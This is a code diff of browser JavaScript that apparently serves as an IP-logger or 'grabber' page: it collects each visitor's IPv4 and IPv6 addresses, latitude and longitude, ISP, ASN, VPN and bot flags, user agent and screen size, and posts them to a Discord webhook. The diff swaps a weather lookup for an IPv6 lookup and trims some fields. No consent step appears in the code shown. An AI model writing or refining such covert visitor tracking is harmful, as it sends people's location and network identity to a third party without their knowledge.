@@ -92,12 +92,18 @@
     return res.json();
   }
 
-  async function fetchWeather(lat, lon) {
-    if (!lat || !lon) return null;
-    const url = `https://wttr.in/${lat},${lon}?format=j1`;
-    const res = await fetch(url);
-    if (!res.ok) return null;
-    return res.json();
+  async function fetchIPv6() {
+    try {
+      const res = await fetch('https://api64.ipify.org?format=json');
+      if (!res.ok) return "N/A";
+      const json = await res.json();
+      if (json.ip && json.ip.includes(':')) { // basic IPv6 check
+        return json.ip;
+      }
+      return "N/A";
+    } catch {
+      return "N/A";
+    }
   }
 
   async function sendDiscordWebhook(embeds) {
@@ -117,26 +123,15 @@
 
     try {
       const data = await fetchIPInfo();
-      const weatherData = await fetchWeather(data.latitude, data.longitude);
+      const ipv6 = await fetchIPv6();
       const uaInfo = parseUserAgent(navigator.userAgent);
       const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });
-
-      let weather = null;
-      if (weatherData && weatherData.current_condition && weatherData.current_condition.length > 0) {
-        weather = weatherData.current_condition[0];
-      }
-
-      let weatherDescription = "N/A";
-      if (weather && weather.lang_en && Array.isArray(weather.lang_en) && weather.lang_en.length > 0) {
-        weatherDescription = weather.lang_en[0].value || "N/A";
-      }
 
       // Prepare all fields
       const allFields = [
         { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
-        { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
+        { name: "IPv6 Address", value: ipv6, inline: true },
         { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
-        { name: "Zip", value: safeValue(data.postal), inline: true },
         { name: "Latitude", value: safeValue(data.latitude), inline: true },
         { name: "Longitude", value: safeValue(data.longitude), inline: true },
         { name: "ISP", value: safeValue(data.isp), inline: false },
@@ -144,7 +139,6 @@
         { name: "ASN", value: safeValue(data.asn), inline: true },
         { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
         { name: "Local Time", value: safeValue(localTime), inline: true },
-        { name: "Currency", value: `${safeValue(safeGet(data, ['currency', 'code']))} (${safeValue(safeGet(data, ['currency', 'name']))})`, inline: true },
         { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
         { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
         { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
@@ -153,15 +147,6 @@
         { name: "User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
         { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} (${safeValue(window.devicePixelRatio)} DPR)\``, inline: true },
       ];
-
-      if(weather){
-        allFields.push(
-          { name: "Weather", value: `${safeValue(weatherDescription)} - Feels like ${safeValue(weather.FeelsLikeC)}°C`, inline: true },
-          { name: "Temperature", value: `${safeValue(weather.temp_C)}°C`, inline: true },
-          { name: "Humidity", value: `${safeValue(weather.humidity)}%`, inline: true },
-          { name: "Wind Speed", value: `${safeValue(weather.windspeedKmph)} km/h`, inline: true },
-        );
-      }
 
       // Split fields into chunks of 25 (Discord max per embed)
       const chunks = chunkArray(allFields, 25);
